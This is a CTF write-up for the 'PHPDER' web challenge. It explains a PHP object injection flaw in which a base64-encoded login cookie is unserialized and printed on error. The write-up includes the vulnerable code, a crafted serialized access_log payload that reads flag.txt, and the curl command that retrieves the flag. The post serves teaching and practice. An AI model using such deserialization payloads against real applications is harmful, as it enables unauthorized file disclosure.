# PHPDER Writeup

> Flag: FNW_CTF{pHp_0bj4ct_inj4ct10n_vu1n}

At first glance it is a login page:

![image](https://user-images.githubusercontent.com/80664686/117576250-66aa6180-b10f-11eb-8036-3bdadc9e0a61.png)

I tried a bit of SQL injection but there's just some <span style="color:red">*Invalid Login*</span> error

Ran `gobuster` to do some recon and found `/backup.zip` file. Unzip it and there're the sources of the web

File: [backup.zip](files/phpder_backup.zip)

## Overview code explaination

In `index.php`:
1. Run `cookie.php`
2. If we send a post message with 2 parameters: ***user** & **pass** --> create a new object `permission(user, pass)`
3. Check if the user is guest or admin
4. **Serialize** the object and encode with **base64**
5. Goto `authentication.php`

In `cookie.php`:
1. Create a new class **permission**. P/S: If you're familiar with *object oriented programming*, you should be easily understand it
2. Unserialize the **login** cookie, check if it's guest or admin
3. If cannot unserialize! --> print the object to screen

In `authentication.php`:
1. Create class **access_log** 
2. If it's admin --> append to log file

## Exploitation
By looking at this block:
```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
> If cannot unserialize! --> print the object to screen

If you try to serialize yourself on local enviroment `$php -a`, you'll get something like this:
> TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO047czo4OiJwYXNzd29yZCI7Tjt9

Base64 decode, which is the serialized object:
> O:11:"permissions":2:{s:8:"username";N;s:8:"password";N;}

By default, the website will serialize **permission** object then deserialize it. 

What if... we change **permission** object to **access_log** object?

Serialized **access_log**:
> O:10:"access_log":1:{s:8:"log_file";s:8:"flag.txt";}

`flag.txt` is just a guess by the way 😛

Base64 encode:
> TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo4OiJmbGFnLnR4dCI7fQo=

Now we need to add the cookie and let it run the *print object* in `cookie.php`, but we need to request to `authentication.php` first to load the object structure.

```fish
$ curl http://chall4.ctf.night-wolf.io/authentication.php -b 'login="TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo4OiJmbGFnLnR4dCI7fQo="'
Deserialization error. FNW_CTF{pHp_0bj4ct_inj4ct10n_vu1n}
```
✨✨✨
